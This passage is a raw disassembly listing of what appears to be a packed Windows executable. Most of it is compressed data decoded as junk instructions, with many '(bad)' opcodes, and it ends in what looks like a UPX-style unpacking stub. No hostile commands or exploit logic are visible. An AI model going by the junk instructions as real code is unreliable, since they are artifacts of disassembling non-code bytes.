   14000f101:	05 e0 03 36 52       	add    $0x523603e0,%eax
   14000f106:	b7 ef                	mov    $0xef,%bh
   14000f108:	f0 01 50 c7          	lock add %edx,-0x39(%rax)
   14000f10c:	a2 77 05 48 32 01 e4 	movabs %al,0xc54be40132480577
   14000f113:	4b c5 
   14000f115:	d6                   	udb
   14000f116:	76 0a                	jbe    0x14000f122
   14000f118:	b6 0a                	mov    $0xa,%dh
   14000f11a:	32 ab 8f 32 08 c2    	xor    -0x3df7cd71(%rbx),%ch
   14000f120:	02 c1                	add    %cl,%al
   14000f122:	17                   	(bad)
   14000f123:	5f                   	pop    %rdi
   14000f124:	5f                   	pop    %rdi
   14000f125:	1b c1                	sbb    %ecx,%eax
   14000f127:	1e                   	(bad)
   14000f128:	58                   	pop    %rax
   14000f129:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   14000f12c:	00 07                	add    %al,(%rdi)
   14000f12e:	8f 09 55 55          	(bad)
   14000f132:	5b                   	pop    %rbx
   14000f133:	01 95 84 aa 2a 88    	add    %edx,-0x77d5557c(%rbp)
   14000f139:	42                   	rex.X
   14000f13a:	42 55                	rex.X push %rbp
   14000f13c:	2b 99 da 01 70 a9    	sub    -0x568ffe26(%rcx),%ebx
   14000f142:	27                   	(bad)
   14000f143:	18 76 a2             	sbb    %dh,-0x5e(%rsi)
   14000f146:	bd 92 fc 38 aa       	mov    $0xaa38fc92,%ebp
   14000f14b:	b7 f8                	mov    $0xf8,%bh
   14000f14d:	a4                   	movsb  (%rsi),(%rdi)
   14000f14e:	0f 72                	pslld  $0x72,(bad)
   14000f150:	72 32                	jb     0x14000f184
   14000f152:	72 06                	jb     0x14000f15a
   14000f154:	a5                   	movsl  (%rsi),(%rdi)
   14000f155:	1a 2a                	sbb    (%rdx),%ch
   14000f157:	38 36                	cmp    %dh,(%rsi)
   14000f159:	6c                   	insb   (%dx),(%rdi)
   14000f15a:	72 72                	jb     0x14000f1ce
   14000f15c:	48 56                	rex.W push %rsi
   14000f15e:	01 62 1f             	add    %esp,0x1f(%rdx)
   14000f161:	c9                   	leave
   14000f162:	c9                   	leave
   14000f163:	c9                   	leave
   14000f164:	ed                   	in     (%dx),%eax
   14000f165:	6a 0f                	push   $0xf
   14000f167:	7a 92                	jp     0x14000f0fb
   14000f169:	a0 c9 c9 c9 c9 b8 c8 	movabs 0xeedcc8b8c9c9c9c9,%al
   14000f170:	dc ee 
   14000f172:	e4 e4                	in     $0xe4,%al
   14000f174:	64 e4 04             	fs in  $0x4,%al
   14000f177:	a6                   	cmpsb  (%rdi),(%rsi)
   14000f178:	1c 38                	sbb    $0x38,%al
   14000f17a:	50                   	push   %rax
   14000f17b:	e4 e4                	in     $0xe4,%al
   14000f17d:	e4 e4                	in     $0xe4,%al
   14000f17f:	68 86 8e 9c 6d       	push   $0x6d9c8e86
   14000f184:	d8 e4                	fsub   %st(4),%st
   14000f186:	e4 ae                	in     $0xae,%al
   14000f188:	be 01 d8 1f 93       	mov    $0x931fd801,%esi
   14000f18d:	db 6c d8 f0          	fldt   -0x10(%rax,%rbx,8)
   14000f191:	2f                   	(bad)
   14000f192:	a7                   	cmpsl  (%rdi),(%rsi)
   14000f193:	0d 0c 0f 1a 93       	or     $0x931a0f0c,%eax
   14000f198:	93                   	xchg   %eax,%ebx
   14000f199:	93                   	xchg   %eax,%ebx
   14000f19a:	93                   	xchg   %eax,%ebx
   14000f19b:	2c 40                	sub    $0x40,%al
   14000f19d:	4a 58                	rex.WX pop %rax
   14000f19f:	93                   	xchg   %eax,%ebx
   14000f1a0:	93                   	xchg   %eax,%ebx
   14000f1a1:	93                   	xchg   %eax,%ebx
   14000f1a2:	93                   	xchg   %eax,%ebx
   14000f1a3:	62 6e 78 84 93       	(bad) {%k4}{z}
   14000f1a8:	93                   	xchg   %eax,%ebx
   14000f1a9:	93                   	xchg   %eax,%ebx
   14000f1aa:	93                   	xchg   %eax,%ebx
   14000f1ab:	8e 98 a0 aa 93 93    	mov    -0x6c6c5560(%rax),%ds
   14000f1b1:	93                   	xchg   %eax,%ebx
   14000f1b2:	93                   	xchg   %eax,%ebx
   14000f1b3:	b2 bc                	mov    $0xbc,%dl
   14000f1b5:	c4                   	(bad)
   14000f1b6:	ce                   	(bad)
   14000f1b7:	93                   	xchg   %eax,%ebx
   14000f1b8:	93                   	xchg   %eax,%ebx
   14000f1b9:	93                   	xchg   %eax,%ebx
   14000f1ba:	93                   	xchg   %eax,%ebx
   14000f1bb:	d8 e2                	fsub   %st(2),%st
   14000f1bd:	ea                   	(bad)
   14000f1be:	f4                   	hlt
   14000f1bf:	c9                   	leave
   14000f1c0:	c9                   	leave
   14000f1c1:	c8 93 fc 06          	enter  $0xfc93,$0x6
   14000f1c5:	a8 10                	test   $0x10,%al
   14000f1c7:	1a 4d 1c             	sbb    0x1c(%rbp),%cl
   14000f1ca:	d2 c9                	ror    %cl,%cl
   14000f1cc:	24 2e                	and    $0x2e,%al
   14000f1ce:	03 3a                	add    (%rdx),%edi
   14000f1d0:	72 72                	jb     0x14000f244
   14000f1d2:	72 bb                	jb     0x14000f18f
   14000f1d4:	1f                   	(bad)
   14000f1d5:	4e 0f 60 6e 7a       	rex.WRX punpcklbw 0x7a(%rsi),%mm5
   14000f1da:	72 72                	jb     0x14000f24e
   14000f1dc:	72 72                	jb     0x14000f250
   14000f1de:	82                   	(bad)
   14000f1df:	96                   	xchg   %eax,%esi
   14000f1e0:	a8 b6                	test   $0xb6,%al
   14000f1e2:	e0 78                	loopne 0x14000f25c
   14000f1e4:	72 72                	jb     0x14000f258
   14000f1e6:	c2 d8 ec             	ret    $0xecd8
   14000f1e9:	a8 8f                	test   $0x8f,%al
   14000f1eb:	00 80 25 88 01 7b    	add    %al,0x7b018825(%rax)
   14000f1f1:	6d                   	insl   (%dx),(%rdi)
   14000f1f2:	c5 0e a0             	(bad)
   14000f1f5:	07                   	(bad)
   14000f1f6:	01 14 a0             	add    %edx,(%rax,%riz,4)
   14000f1f9:	07                   	(bad)
   14000f1fa:	b5 43                	mov    $0x43,%ch
   14000f1fc:	4b 01 01             	rex.WXB add %rax,(%r9)
   14000f1ff:	28 a0 07 11 3b b0    	sub    %ah,-0x4fc4eef9(%rax)
   14000f205:	14 01                	adc    $0x1,%al
   14000f207:	3c a0                	cmp    $0xa0,%al
   14000f209:	07                   	(bad)
   14000f20a:	3b 41 54             	cmp    0x54(%rcx),%eax
   14000f20d:	2c 01                	sub    $0x1,%al
   14000f20f:	01 30                	add    %esi,(%rax)
   14000f211:	31 65 25             	xor    %esp,0x25(%rbp)
   14000f214:	d8 05 10 2d a1 aa    	fadds  -0x555ed2f0(%rip)        # 0xeaa21f2a
   14000f21a:	6a 5f                	push   $0x5f
   14000f21c:	ef                   	out    %eax,(%dx)
   14000f21d:	17                   	(bad)
   14000f21e:	c0 00 01             	rolb   $0x1,(%rax)
   14000f221:	92                   	xchg   %eax,%edx
   14000f222:	50                   	push   %rax
   14000f223:	55                   	push   %rbp
   14000f224:	25 55 49 a8 aa       	and    $0xaaa84955,%eax
   14000f229:	aa                   	stos   %al,(%rdi)
   14000f22a:	aa                   	stos   %al,(%rdi)
   14000f22b:	24 54                	and    $0x54,%al
   14000f22d:	5d                   	pop    %rbp
   14000f22e:	50                   	push   %rax
   14000f22f:	54                   	push   %rsp
   14000f230:	12 c6                	adc    %dh,%al
   14000f232:	42 7b 95             	rex.X jnp 0x14000f1ca
   14000f235:	f1                   	int1
   14000f236:	06                   	(bad)
   14000f237:	f0 92                	lock xchg %eax,%edx
   14000f239:	f2 42                	repnz rex.X
   14000f23b:	65 65 70 0a          	gs gs jo 0x14000f249
   14000f23f:	43 0a ed             	rex.XB or %r13b,%bpl
   14000f242:	bd 8a 46 74 65       	mov    $0x6574468a,%ebp
   14000f247:	54                   	push   %rsp
   14000f248:	68 0c 64 1a 44       	push   $0x441a640c
   14000f24d:	30 58 30             	xor    %bl,0x30(%rax)
   14000f250:	27                   	(bad)
   14000f251:	81 26 a8 39 24 54    	andl   $0x542439a8,(%rsi)
   14000f257:	53                   	push   %rbx
   14000f258:	e6 53                	out    %al,$0x53
   14000f25a:	25 d0 3e 29 6c       	and    $0x6c293ed0,%eax
   14000f25f:	2d 40 41 18 45       	sub    $0x45184140,%eax
   14000f264:	6f                   	outsl  (%rsi),(%dx)
   14000f265:	47 2b 92 98 72 45 47 	rex.RXB sub 0x47457298(%r10),%r10d
   14000f26c:	40                   	rex
   14000f26d:	4c 61                	rex.WR (bad)
   14000f26f:	73 74                	jae    0x14000f2e5
   14000f271:	ed                   	in     (%dx),%eax
   14000f272:	9d                   	popf
   14000f273:	91                   	xchg   %eax,%ecx
   14000f274:	84 45 9f             	test   %al,-0x61(%rbp)
   14000f277:	1b 4d 6f             	sbb    0x6f(%rbp),%ecx
   14000f27a:	64 75 5e             	fs jne 0x14000f2db
   14000f27d:	48 37                	rex.W (bad)
   14000f27f:	48 78 ef             	rex.W js 0x14000f271
   14000f282:	61                   	(bad)
   14000f283:	6e                   	outsb  (%rsi),(%dx)
   14000f284:	64 6b 22 53          	imul   $0x53,%fs:(%rdx),%esp
   14000f288:	ca 74 75             	lret   $0x7574
   14000f28b:	70 dc                	jo     0x14000f269
   14000f28d:	90                   	nop
   14000f28e:	c2 f6 49             	ret    $0x49f6
   14000f291:	6e                   	outsb  (%rsi),(%dx)
   14000f292:	66 6f                	outsw  (%rsi),(%dx)
   14000f294:	21 05 44 69 72 28    	and    %eax,0x28726944(%rip)        # 0x168735bde
   14000f29a:	64 ad                	lods   %fs:(%rsi),%eax
   14000f29c:	2c ed                	sub    $0xed,%al
   14000f29e:	79 29                	jns    0x14000f2c9
   14000f2a0:	2c 58                	sub    $0x58,%al
   14000f2a2:	60                   	(bad)
   14000f2a3:	a9 0d 2b 62 0a       	test   $0xa622b0d,%eax
   14000f2a8:	a6                   	cmpsb  (%rdi),(%rsi)
   14000f2a9:	82                   	(bad)
   14000f2aa:	2f                   	(bad)
   14000f2ab:	c8 6c 69 7a          	enter  $0x696c,$0x7a
   14000f2af:	33 4c 6c 76          	xor    0x76(%rsp,%rbp,2),%ecx
   14000f2b3:	3b 29                	cmp    (%rcx),%ebp
   14000f2b5:	d8 d4                	fcom   %st(4)
   14000f2b7:	2b 53 8c             	sub    -0x74(%rbx),%edx
   14000f2ba:	be 73 6f df df       	mov    $0xdfdf6f73,%esi
   14000f2bf:	04 b7                	add    $0xb7,%al
   14000f2c1:	6c                   	insb   (%dx),(%rdi)
   14000f2c2:	34 74                	xor    $0x74,%al
   14000f2c4:	72 6c                	jb     0x14000f332
   14000f2c6:	07                   	(bad)
   14000f2c7:	72 2d                	jb     0x14000f2f6
   14000f2c9:	55                   	push   %rbp
   14000f2ca:	6e                   	outsb  (%rsi),(%dx)
   14000f2cb:	68 1b 64 f8 0e       	push   $0xef8641b
   14000f2d0:	9c                   	pushf
   14000f2d1:	e0 45                	loopne 0x14000f318
   14000f2d3:	78 63                	js     0x14000f338
   14000f2d5:	fc                   	cld
   14000f2d6:	5b                   	pop    %rbx
   14000f2d7:	aa                   	stos   %al,(%rdi)
   14000f2d8:	74 39                	je     0x14000f313
   14000f2da:	6c                   	insb   (%dx),(%rdi)
   14000f2db:	0b 09                	or     (%rcx),%ecx
   14000f2dd:	07                   	(bad)
   14000f2de:	7f 1f                	jg     0x14000f2ff
   14000f2e0:	54                   	push   %rsp
   14000f2e1:	6c                   	insb   (%dx),(%rdi)
   14000f2e2:	73 08                	jae    0x14000f2ec
   14000f2e4:	56                   	push   %rsi
   14000f2e5:	e8 d8 20 92 60       	call   0x1a09313c2
   14000f2ea:	18 a3 1f b4 cd 49    	sbb    %ah,0x49cdb41f(%rbx)
   14000f2f0:	c2 33 1a             	ret    $0x1a33
   14000f2f3:	57                   	push   %rdi
   14000f2f4:	61                   	(bad)
   14000f2f5:	ec                   	in     (%dx),%al
   14000f2f6:	46 0a 77 db          	rex.RX or -0x25(%rdi),%r14b
   14000f2fa:	16                   	(bad)
   14000f2fb:	42                   	rex.X
   14000f2fc:	4d 75 80             	rex.WRB jne 0x14000f27f
   14000f2ff:	69 70 7a 4f 62 6a 48 	imul   $0x486a624f,0x7a(%rax),%esi
   14000f306:	19 94 87 42 cc bc c2 	sbb    %edx,-0x3d4333be(%rdi,%rax,4)
   14000f30d:	b0 b7                	mov    $0xb7,%al
   14000f30f:	17                   	(bad)
   14000f310:	1c d6                	sbb    $0xd6,%al
   14000f312:	60                   	(bad)
   14000f313:	44 60                	rex.R (bad)
   14000f315:	41 19 53 6f          	sbb    %edx,0x6f(%r11)
   14000f319:	8c 64 42 72          	mov    %fs,0x72(%rdx,%rax,2)
   14000f31d:	1f                   	(bad)
   14000f31e:	64 d7                	xlat   %fs:(%rbx)
   14000f320:	e0 75                	loopne 0x14000f397
   14000f322:	73 68                	jae    0x14000f38c
   14000f324:	1d 6c 60 6d 39       	sbb    $0x396d606c,%eax
   14000f329:	42 6b 87 7d 82 05 6a 	rex.X imul $0x6c,0x6a05827d(%rdi),%eax
   14000f330:	6c 
   14000f331:	6f                   	outsl  (%rsi),(%dx)
   14000f332:	51                   	push   %rcx
   14000f333:	54                   	push   %rsp
   14000f334:	65 78 74             	gs js  0x14000f3ab
   14000f337:	1b 74 72 be          	sbb    -0x42(%rdx,%rsi,2),%esi
   14000f33b:	6f                   	outsl  (%rsi),(%dx)
   14000f33c:	77 6f                	ja     0x14000f3ad
   14000f33e:	1e                   	(bad)
   14000f33f:	63 68 42             	movsxd 0x42(%rax),%ebp
   14000f342:	6c                   	insb   (%dx),(%rdi)
   14000f343:	4a 2d 4f 75 9e 00    	rex.WX sub $0x9e754f,%rax
   14000f349:	d3 ca                	ror    %cl,%edx
   14000f34b:	90                   	nop
   14000f34c:	93                   	xchg   %eax,%ebx
   14000f34d:	0f 25                	(bad)
   14000f34f:	d8 7f 5f             	fdivrs 0x5f(%rdi)
   14000f352:	5f                   	pop    %rdi
   14000f353:	43 5f                	rex.XB pop %r15
   14000f355:	73 70                	jae    0x14000f3c7
   14000f357:	86 3c 5f             	xchg   %bh,(%rdi,%rbx,2)
   14000f35a:	68 94 60 2d 04       	push   $0x42d6094
   14000f35f:	d7                   	xlat   (%rbx)
   14000f360:	2a 67 68             	sub    0x68(%rdi),%ah
   14000f363:	a1 2b 92 70 80 b2 73 	movabs 0x691d73b28070922b,%eax
   14000f36a:	1d 69 
   14000f36c:	df ba ff fb 88 65    	fistpll 0x6588fbff(%rdx)
   14000f372:	6e                   	outsb  (%rsi),(%dx)
   14000f373:	76 15                	jbe    0x14000f38a
   14000f375:	6f                   	outsl  (%rsi),(%dx)
   14000f376:	62 5f 66 75 6e       	(bad)
   14000f37b:	63 17                	movsxd (%rdi),%edx
   14000f37d:	73 4a                	jae    0x14000f3c9
   14000f37f:	5f                   	pop    %rdi
   14000f380:	61                   	(bad)
   14000f381:	70 70                	jo     0x14000f3f3
   14000f383:	5f                   	pop    %rdi
   14000f384:	50                   	push   %rax
   14000f385:	42 bb d9 74 79 84    	rex.X mov $0x847974d9,%ebx
   14000f38b:	1f                   	(bad)
   14000f38c:	75 06                	jne    0x14000f394
   14000f38e:	72 b3                	jb     0x14000f343
   14000f390:	77 ed                	ja     0x14000f37f
   14000f392:	97                   	xchg   %eax,%edi
   14000f393:	19 22                	sbb    %esp,(%rdx)
   14000f395:	61                   	(bad)
   14000f396:	63 6d a2             	movsxd -0x5e(%rbp),%ebp
   14000f399:	6e                   	outsb  (%rsi),(%dx)
   14000f39a:	11 6d 73             	adc    %ebp,0x73(%rbp)
   14000f39d:	67 5f                	addr32 pop %rdi
   14000f39f:	fc                   	cld
   14000f3a0:	8a b6 ee 87 3d 16    	mov    0x163d87ee(%rsi),%dh
   14000f3a6:	63 0f                	movsxd (%rdi),%ecx
   14000f3a8:	6f                   	outsl  (%rsi),(%dx)
   14000f3a9:	6d                   	insl   (%dx),(%rdi)
   14000f3aa:	6d                   	insl   (%dx),(%rdi)
   14000f3ab:	6f                   	outsl  (%rsi),(%dx)
   14000f3ac:	64 71 66             	fs jno 0x14000f415
   14000f3af:	0f 09                	wbinvd
   14000f3b1:	db f7                	fcomi  %st(7),%st
   14000f3b3:	e0 cd                	loopne 0x14000f382
   14000f3b5:	9e                   	sahf
   14000f3b6:	6d                   	insl   (%dx),(%rdi)
   14000f3b7:	14 6f                	adc    $0x6f,%al
   14000f3b9:	6e                   	outsb  (%rsi),(%dx)
   14000f3ba:	4b e2 04             	rex.WXB loop 0x14000f3c1
   14000f3bd:	db 43 0a             	fildl  0xa(%rbx)
   14000f3c0:	36 34 10             	ss xor $0x10,%al
   14000f3c3:	61                   	(bad)
   14000f3c4:	62 9c 1e 1a 14       	(bad)
   14000f3c9:	67 f7 52 6c          	notl   0x6c(%edx)
   14000f3cd:	6f                   	outsl  (%rsi),(%dx)
   14000f3ce:	f8                   	clc
   14000f3cf:	3b 66 70             	cmp    0x70(%rsi),%esp
   14000f3d2:	7a 40                	jp     0x14000f414
   14000f3d4:	66 1e                	data16 (bad)
   14000f3d6:	16                   	(bad)
   14000f3d7:	9e                   	sahf
   14000f3d8:	e0 10                	loopne 0x14000f3ea
   14000f3da:	ca 80 66             	lret   $0x6680
   14000f3dd:	ed                   	in     (%dx),%eax
   14000f3de:	c1 c3 6d             	rol    $0x6d,%ebx
   14000f3e1:	6b 0e 6d             	imul   $0x6d,(%rsi),%ecx
   14000f3e4:	49 72 6d             	rex.WB jb 0x14000f454
   14000f3e7:	63 70 d8             	movsxd -0x28(%rax),%esi
   14000f3ea:	72 b0                	jb     0x14000f39c
   14000f3ec:	ed                   	in     (%dx),%eax
   14000f3ed:	5e                   	pop    %rsi
   14000f3ee:	4a b0 0a             	rex.WX mov $0xa,%al
   14000f3f1:	0c 61                	or     $0x61,%al
   14000f3f3:	6c                   	insb   (%dx),(%rdi)
   14000f3f4:	0e                   	(bad)
   14000f3f5:	1d 85 e5 ec 86       	sbb    $0x86ece585,%eax
   14000f3fa:	32 63 61             	xor    0x61(%rbx),%ah
   14000f3fd:	74 0f                	je     0x14000f40e
   14000f3ff:	70 79                	jo     0x14000f47a
   14000f401:	58                   	pop    %rax
   14000f402:	14 b8                	adc    $0xb8,%al
   14000f404:	a7                   	cmpsl  (%rdi),(%rsi)
   14000f405:	ac                   	lods   (%rsi),%al
   14000f406:	0f ba 6d 9a e1       	btsl   $0xe1,-0x66(%rbp)
   14000f40b:	b0 73                	mov    $0x73,%al
   14000f40d:	59                   	pop    %rcx
   14000f40e:	91                   	xchg   %eax,%ecx
   14000f40f:	01 76 cb             	add    %esi,-0x35(%rsi)
   14000f412:	00 de                	add    %bl,%dh
   14000f414:	76 8e                	jbe    0x14000f3a4
   14000f416:	67 d4                	addr32 (bad)
   14000f418:	6d                   	insl   (%dx),(%rdi)
   14000f419:	94                   	xchg   %eax,%esp
   14000f41a:	fd                   	std
   14000f41b:	20 67 d9             	and    %ah,-0x27(%rdi)
   14000f41e:	54                   	push   %rsp
   14000f41f:	6f                   	outsl  (%rsi),(%dx)
   14000f420:	02 1c 7f             	add    (%rdi,%rdi,2),%bl
   14000f423:	78 4e                	js     0x14000f473
   14000f425:	15 e4 4e be 48       	adc    $0x48be4ee4,%eax
   14000f42a:	6f                   	outsl  (%rsi),(%dx)
   14000f42b:	6f                   	outsl  (%rsi),(%dx)
   14000f42c:	6b 3c 7e d8          	imul   $0xffffffd8,(%rsi,%rdi,2),%edi
   14000f430:	a2 8d d1 75 6d 1b 18 	movabs %al,0x6c4c181b6d75d18d
   14000f437:	4c 6c 
   14000f439:	52                   	push   %rdx
   14000f43a:	76 45                	jbe    0x14000f481
   14000f43c:	3f                   	(bad)
   14000f43d:	2e 51                	cs push %rcx
   14000f43f:	3c 44                	cmp    $0x44,%al
   14000f441:	43 7f 4d             	rex.XB jg 0x14000f491
   14000f444:	10 05 8e ec 6b 94    	adc    %al,-0x6b941372(%rip)        # 0xd46ce0d8
   14000f44a:	63 44 49 73          	movsxd 0x73(%rcx,%rcx,2),%eax
   14000f44e:	5b                   	pop    %rbx
   14000f44f:	4a                   	rex.WX
   14000f450:	4c 62 21 a6 60 83    	(bad)
   14000f456:	6c                   	insb   (%dx),(%rdi)
   14000f457:	86 32                	xchg   %dh,(%rdx)
   14000f459:	76 6b                	jbe    0x14000f4c6
   14000f45b:	32 5b 5c             	xor    0x5c(%rbx),%bl
   14000f45e:	0c 42                	or     $0x42,%al
   14000f460:	6f                   	outsl  (%rsi),(%dx)
   14000f461:	78 fe                	js     0x14000f461
   14000f463:	78 24                	js     0x14000f489
   14000f465:	40                   	rex
   14000f466:	65 75 0a             	gs jne 0x14000f473
   14000f469:	c7                   	(bad)
   14000f46a:	8f 85 bc 6e 65 67    	pop    0x67656ebc(%rbp)
   14000f470:	ac                   	lods   (%rsi),%al
   14000f471:	08 7d d9             	or     %bh,-0x27(%rbp)
   14000f474:	f6 b2 64 67 29 d9    	divb   -0x26d6989c(%rdx)
   14000f47a:	ff 64 53 68          	jmp    *0x68(%rbx,%rdx,2)
   14000f47e:	3f                   	(bad)
   14000f47f:	e4 7f                	in     $0x7f,%al
   14000f481:	9b                   	fwait
   14000f482:	1a 3d 01 f0 56 05    	sbb    0x556f001(%rip),%bh        # 0x14557e489
   14000f488:	0a 15 0f f0 d1 22    	or     0x22d1f00f(%rip),%dl        # 0x162d2e49d
   14000f48e:	f0 4f 21 6f fe       	lock rex.WRXB and %r13,-0x2(%r15)
   14000f493:	98                   	cwtl
   14000f494:	0a f0                	or     %al,%dh
   14000f496:	d0 1c 20             	rcrb   $1,(%rax,%riz,1)
   14000f499:	08 f0                	or     %dh,%al
   14000f49b:	f8                   	clc
   14000f49c:	02 10                	add    (%rax),%dl
   14000f49e:	f0 e8 4a f5 7f 30    	lock call 0x17080e9ee
   14000f4a4:	f1                   	int1
   14000f4a5:	18 18                	sbb    %bl,(%rax)
   14000f4a7:	08 00                	or     %al,(%rax)
   14000f4a9:	de 64 86 0a          	fisubs 0xa(%rsi,%rax,4)
   14000f4ad:	00 14 a9             	add    %dl,(%rcx,%rbp,4)
   14000f4b0:	b9 68 e0 bd ff       	mov    $0xffbde068,%ecx
   14000f4b5:	c3                   	ret
   14000f4b6:	1f                   	(bad)
   14000f4b7:	f0 00 2e             	lock add %ch,(%rsi)
   14000f4ba:	02 0b                	add    (%rbx),%cl
   14000f4bc:	02 02                	add    (%rdx),%al
   14000f4be:	28 00                	sub    %al,(%rax)
   14000f4c0:	2a 18                	sub    (%rax),%bl
   14000f4c2:	5e                   	pop    %rsi
   14000f4c3:	06                   	(bad)
   14000f4c4:	02 3d b7 71 6d cf    	add    -0x30928e49(%rip),%bh        # 0x10f6e6681
   14000f4ca:	03 40 01             	add    0x1(%rax),%eax
   14000f4cd:	00 42 11             	add    %al,0x11(%rdx)
   14000f4d0:	b7 b7                	mov    $0xb7,%bh
   14000f4d2:	17                   	(bad)
   14000f4d3:	2e 04 67             	cs add $0x67,%al
   14000f4d6:	05 8b cf de ed       	add    $0xeddecf8b,%eax
   14000f4db:	f7 e0                	mul    %eax
   14000f4dd:	00 29                	add    %ch,(%rcx)
   14000f4df:	0d c4 06 03 00       	or     $0x306c4,%eax
   14000f4e4:	60                   	(bad)
   14000f4e5:	54                   	push   %rsp
   14000f4e6:	20 2f                	and    %ch,(%rdi)
   14000f4e8:	10 00                	adc    %al,(%rax)
   14000f4ea:	00 23                	add    %ah,(%rbx)
   14000f4ec:	dd c6                	ffree  %st(6)
   14000f4ee:	60                   	(bad)
   14000f4ef:	11 9b db 09 05 6e    	adc    %ebx,0x6e0509db(%rbx)
   14000f4f5:	b1 ae                	mov    $0xae,%cl
   14000f4f7:	44 0a 1f             	or     (%rdi),%r11b
   14000f4fa:	d2 9c 4d 5c 70 6b 01 	rcrb   %cl,0x16b705c(%rbp,%rcx,2)
   14000f501:	8a 00                	mov    (%rax),%al
   14000f503:	8d 12                	lea    (%rdx),%edx
   14000f505:	2a 98 97 ae 56 2c    	sub    0x2c56ae97(%rax),%bl
   14000f50b:	e0 60                	loopne 0x14000f56d
   14000f50d:	76 28                	jbe    0x14000f537
   14000f50f:	2f                   	(bad)
   14000f510:	b0 4e                	mov    $0x4e,%al
   14000f512:	b1 cd                	mov    $0xcd,%cl
   14000f514:	02 0e                	add    (%rsi),%cl
   14000f516:	48 02 6f 2e          	rex.W add 0x2e(%rdi),%bpl
   14000f51a:	74 0a                	je     0x14000f526
   14000f51c:	5e                   	pop    %rsi
   14000f51d:	f0 2d cc 0e f8 28    	lock sub $0x28f80ecc,%eax
   14000f523:	21 2a                	and    %ebp,(%rdx)
   14000f525:	00 b9 ce 16 5e 58    	add    %bh,0x585e16ce(%rcx)
   14000f52b:	b7 04                	mov    $0x4,%bh
   14000f52d:	2e 2e c4             	cs cs (bad)
   14000f530:	6e                   	outsb  (%rsi),(%dx)
   14000f531:	0e                   	(bad)
   14000f532:	0d 4d 03 13 47       	or     $0x4713034d,%eax
   14000f537:	2e 4f cf             	cs rex.WRXB iretq
   14000f53a:	7b 67                	jnp    0x14000f5a3
   14000f53c:	bf 2c c0 2e 72       	mov    $0x722ec02c,%edi
   14000f541:	51                   	push   %rcx
   14000f542:	30 15 20 50 06 16    	xor    %dl,0x16065020(%rip)        # 0x156074568
   14000f548:	32 7b 10             	xor    0x10(%rbx),%bh
   14000f54b:	f9                   	stc
   14000f54c:	68 4f 40 2e 70       	push   $0x702e404f
   14000f551:	c7                   	(bad)
   14000f552:	70 9f                	jo     0x14000f4f3
   14000f554:	54                   	push   %rsp
   14000f555:	46 ae                	rex.RX scas (%rdi),%al
   14000f557:	76 48                	jbe    0x14000f5a1
   14000f559:	4f 78 68             	rex.WRXB js 0x14000f5c4
   14000f55c:	80 00 c4             	addb   $0xc4,(%rax)
   14000f55f:	95                   	xchg   %eax,%ebp
   14000f560:	9c                   	pushf
   14000f561:	4c 62 97 20 68 f1    	(bad)
   14000f567:	0b 90 49 90 d7 7c    	or     0x7cd79049(%rax),%edx
   14000f56d:	f0 3e 64 05 3e 69 9f 	lock ds fs add $0xd79f693e,%eax
   14000f574:	d7 
   14000f575:	a0 06 0c 2c 78 28 58 	movabs 0x8f4f5828782c0c06,%al
   14000f57c:	4f 8f 
   14000f57e:	43 52                	rex.XB push %r10
   14000f580:	54                   	push   %rsp
   14000f581:	f7 57 eb             	notl   -0x15(%rdi)
   14000f584:	2e 28 85 ff 5c 4f 74 	cs sub %al,0x744f5cff(%rbp)
   14000f58b:	60                   	(bad)
   14000f58c:	b8 1d c5 6c 73       	mov    $0x736cc51d,%eax
   14000f591:	97                   	xchg   %eax,%edi
   14000f592:	c0 4f 5e 2f          	rorb   $0x2f,0x5e(%rdi)
   14000f596:	dc a6 b0 1a 65 89    	fsubl  -0x769ae550(%rsi)
   14000f59c:	87 d0                	xchg   %edx,%eax
   14000f59e:	4f 60                	rex.WRXB (bad)
   14000f5a0:	0d f0 de 91 42       	or     $0x4291def0,%eax
   14000f5a5:	37                   	(bad)
   14000f5a6:	00 bb a9 fc 24 49    	add    %bh,0x4924fca9(%rbx)
   14000f5ac:	92                   	xchg   %eax,%edx
   14000f5ad:	70 08                	jo     0x14000f5b7
   14000f5af:	00 00                	add    %al,(%rax)
   14000f5b1:	a0 92 ff 00 00 00 00 	movabs 0xff92,%al
   14000f5b8:	00 00 
   14000f5ba:	00 00                	add    %al,(%rax)
   14000f5bc:	00 00                	add    %al,(%rax)
   14000f5be:	00 00                	add    %al,(%rax)
   14000f5c0:	53                   	push   %rbx
   14000f5c1:	56                   	push   %rsi
   14000f5c2:	57                   	push   %rdi
   14000f5c3:	55                   	push   %rbp
   14000f5c4:	48 8d 35 5a da ff ff 	lea    -0x25a6(%rip),%rsi        # 0x14000d025
   14000f5cb:	48 8d be db 3f ff ff 	lea    -0xc025(%rsi),%rdi
   14000f5d2:	57                   	push   %rdi
   14000f5d3:	31 db                	xor    %ebx,%ebx
   14000f5d5:	31 c9                	xor    %ecx,%ecx
   14000f5d7:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   14000f5db:	e8 50 00 00 00       	call   0x14000f630
   14000f5e0:	01 db                	add    %ebx,%ebx
   14000f5e2:	74 02                	je     0x14000f5e6
   14000f5e4:	f3 c3                	repz ret
   14000f5e6:	8b 1e                	mov    (%rsi),%ebx
   14000f5e8:	48 83 ee fc          	sub    $0xfffffffffffffffc,%rsi
   14000f5ec:	11 db                	adc    %ebx,%ebx
   14000f5ee:	8a 16                	mov    (%rsi),%dl
   14000f5f0:	f3 c3                	repz ret
   14000f5f2:	48 8d 04 2f          	lea    (%rdi,%rbp,1),%rax
   14000f5f6:	83 f9 05             	cmp    $0x5,%ecx
   14000f5f9:	8a 10                	mov    (%rax),%dl
   14000f5fb:	76 21                	jbe    0x14000f61e
   14000f5fd:	48 83 fd fc          	cmp    $0xfffffffffffffffc,%rbp
   14000f601:	77 1b                	ja     0x14000f61e
   14000f603:	83 e9 04             	sub    $0x4,%ecx
   14000f606:	8b 10                	mov    (%rax),%edx
   14000f608:	48 83 c0 04          	add    $0x4,%rax
   14000f60c:	83 e9 04             	sub    $0x4,%ecx
   14000f60f:	89 17                	mov    %edx,(%rdi)
   14000f611:	48 8d 7f 04          	lea    0x4(%rdi),%rdi
   14000f615:	73 ef                	jae    0x14000f606
   14000f617:	83 c1 04             	add    $0x4,%ecx
   14000f61a:	8a 10                	mov    (%rax),%dl
   14000f61c:	74 10                	je     0x14000f62e
   14000f61e:	48 ff c0             	inc    %rax
   14000f621:	88 17                	mov    %dl,(%rdi)
   14000f623:	83 e9 01             	sub    $0x1,%ecx
   14000f626:	8a 10                	mov    (%rax),%dl
   14000f628:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
